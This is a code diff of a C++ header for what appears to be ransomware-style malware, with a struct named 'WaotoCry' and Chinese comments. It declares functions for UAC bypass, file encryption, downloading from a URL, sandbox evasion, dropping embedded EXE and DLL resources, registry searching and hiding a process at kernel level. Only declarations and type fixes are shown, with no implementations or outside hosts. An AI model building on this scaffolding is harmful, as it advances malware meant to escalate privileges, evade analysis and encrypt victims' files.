@@ -19,22 +19,23 @@ typedef struct
 	int Proconn_data;
 	int process_break_sendbox;
 	char *get_process_dir;
-	char process_new_path;
+	char* process_new_path;
 	string process_pid_path;
 	string target_process_path;
 	string usl_path;
 
 	DWORD get_pid;
+	BOOL search;
+	BOOL off;
 }WaotoCry;
 
 
 
 
 //Bypass.cpp
-int add_double_data(char new_process_path);
-
-int increase(char start_process);
-
+int add_double_data(char* new_process_path);
+int increase(char* start_process);
+int search_regedit();
 int BypassUAC();
 
 //Encryption
@@ -45,16 +46,14 @@ int Encryption(char process_path);
 int downnload(string usl);
 
 
-
-
-
-
 //Funtions
 string password();
 void no_windows();
-char new_process_path(); //获取当前PROCESS路径
+char *new_process_path(); //获取当前PROCESS路径
 char *Get_Process_in_dir();
 string replace_string(string no_replace, string need_relace_string, string befor_replace);//修改字符串内指定字符
+int reaname(char *old_name, char *new_name); //Modifly file name 
+
 
 //Anti Sendbox
 DWORD get_parent_processid(DWORD pid);
@@ -68,3 +67,10 @@ string process_pid_to_path(DWORD process_pid);
 bool CreateMyFile(char* strFilePath, LPBYTE lpBuffer, DWORD dwSize);
 bool CreateEXE(char* strFilePath, int nResourceID, char* strResourceName);
 BOOL ReleaseDLLRes(LPCTSTR szDLLFullPath, UINT uResID, LPCTSTR szResType);//释放DLL到指定目录
+char Getsystemtamppath(); //GetsystemTempPath
+
+
+
+
+//Kernel.cpp 内核操作CPP
+int hide_process(string process);//hide process 
